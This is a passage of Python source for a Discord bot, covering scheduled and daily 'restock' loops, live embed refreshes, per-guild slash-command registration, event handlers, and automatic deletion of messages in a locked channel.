    now = _now()
    mst_hour = (now.hour - 7) % 24
    current = f"{mst_hour:02d}:{now.minute:02d}"
    today = now.strftime("%Y-%m-%d")
    if current != daily.get("time") or daily.get("lastRanDate") == today:
        return
    daily["lastRanDate"] = today
    write_daily_restock(daily)
    embed = await do_restock(daily.get("rawTokens", ""))
    notify = discord.Embed(
        title="📅 Daily Restock Ran",
        description=f"Daily restock at **{daily.get('time')} MST** has completed.",
        color=0x57F287,
        timestamp=now,
    )
    try:
        ch = await bot.fetch_channel(int(daily["channelId"]))
        await ch.send(embeds=[notify, embed])
    except Exception:
        log.exception("Could not notify channel for daily restock")


@tasks.loop(minutes=1)
async def scheduled_restock_loop():
    pending = read_scheduled_restocks()
    now_ms = int(_now().timestamp() * 1000)
    due = [s for s in pending if s.get("runAt", 0) <= now_ms]
    if not due:
        return
    write_scheduled_restocks([s for s in pending if s.get("runAt", 0) > now_ms])
    for s in due:
        embed = await do_restock(s.get("rawTokens", ""))
        notify = discord.Embed(
            title="📅 Scheduled Restock Ran",
            description=(
                f"Schedule `{s.get('id')}` (created by <@{s.get('createdBy')}>) "
                "has completed."
            ),
            color=0x57F287,
            timestamp=_now(),
        )
        try:
            ch = await bot.fetch_channel(int(s["channelId"]))
            await ch.send(embeds=[notify, embed])
        except Exception:
            log.exception("Could not notify channel for scheduled restock")


@tasks.loop(seconds=30)
async def live_embed_loop():
    for type_, ref in list(bot.live_messages.items()):
        try:
            ch = await bot.fetch_channel(ref["channel_id"])
            msg = await ch.fetch_message(ref["message_id"])
            embed = E.stock_embed() if type_ == "stock" else E.status_embed(bot, bot._bot_start_time)
            await msg.edit(embed=embed)
        except Exception:
            bot.live_messages.pop(type_, None)


# ─── Lifecycle ────────────────────────────────────────────────────────────────


async def _register_commands_for_guild(guild_id: int) -> None:
    g = discord.Object(id=guild_id)
    bot.tree.copy_global_to(guild=g)
    try:
        await bot.tree.sync(guild=g)
    except Exception:
        log.exception("Failed to sync commands for guild %s", guild_id)


@bot.event
async def on_ready():
    log.info("Discord bot ready as %s", bot.user)
    bot._bot_start_time = _now()
    db_init()
    for g in bot.guilds:
        bot.server_join_times.setdefault(g.id, _now())
    # Register slash commands per-guild for instant availability.
    for g in bot.guilds:
        await _register_commands_for_guild(g.id)
    # Start the background loops (idempotent).
    if not auto_leave_loop.is_running():
        auto_leave_loop.start()
    if not daily_restock_loop.is_running():
        daily_restock_loop.start()
    if not scheduled_restock_loop.is_running():
        scheduled_restock_loop.start()
    if not live_embed_loop.is_running():
        live_embed_loop.start()


@bot.event
async def on_guild_join(guild: discord.Guild):
    bot.server_join_times[guild.id] = _now()
    log.info("Joined guild %s (%s)", guild.name, guild.id)
    await _register_commands_for_guild(guild.id)


@bot.event
async def on_guild_remove(guild: discord.Guild):
    bot.server_join_times.pop(guild.id, None)
    log.info("Left guild %s", guild.id)


@bot.event
async def on_interaction(interaction: discord.Interaction):
    # Slash command dispatch is handled by CommandTree automatically.
    if interaction.type != discord.InteractionType.component:
        return
    cid = (interaction.data or {}).get("custom_id", "")
    if cid.startswith("cp:"):
        try:
            await handle_control_panel_button(interaction, bot.server_join_times)
        except Exception:
            log.exception("Control panel button error")
            try:
                await interaction.response.send_message(
                    "❌ An error occurred handling that button.", ephemeral=True
                )
            except Exception:
                pass
    # gecko: buttons are handled by the persistent SubscribeView itself.


@bot.event
async def on_message(message: discord.Message):
    # Soft enforcement of djoin channel-lock: non-owners typing in the locked
    # channel get their messages auto-deleted after 15s (mirrors the TS bot).
    if message.guild and not message.author.bot:
        djoin_ch = get_channel_lock(str(message.guild.id), "djoin")
        if djoin_ch and str(message.channel.id) == djoin_ch:
            guild_owner_id = str(message.guild.owner_id)
            if not is_authorized_member(
                guild_owner_id, str(message.guild.id), str(message.author.id), message.author
            ):
                async def _delete_later(m: discord.Message) -> None:
                    await asyncio.sleep(15)
                    try:
                        await m.delete()
                    except Exception:
                        pass

                asyncio.create_task(_delete_later(message))
    await handle_prefix(message)


async def start_bot() -> None:
    if not BOT_TOKEN:
        log.warning("DISCORD_BOT_TOKEN not set — bot will not start")
        return
    try:
        await bot.start(BOT_TOKEN)
    except Exception:
        log.exception("Bot crashed")
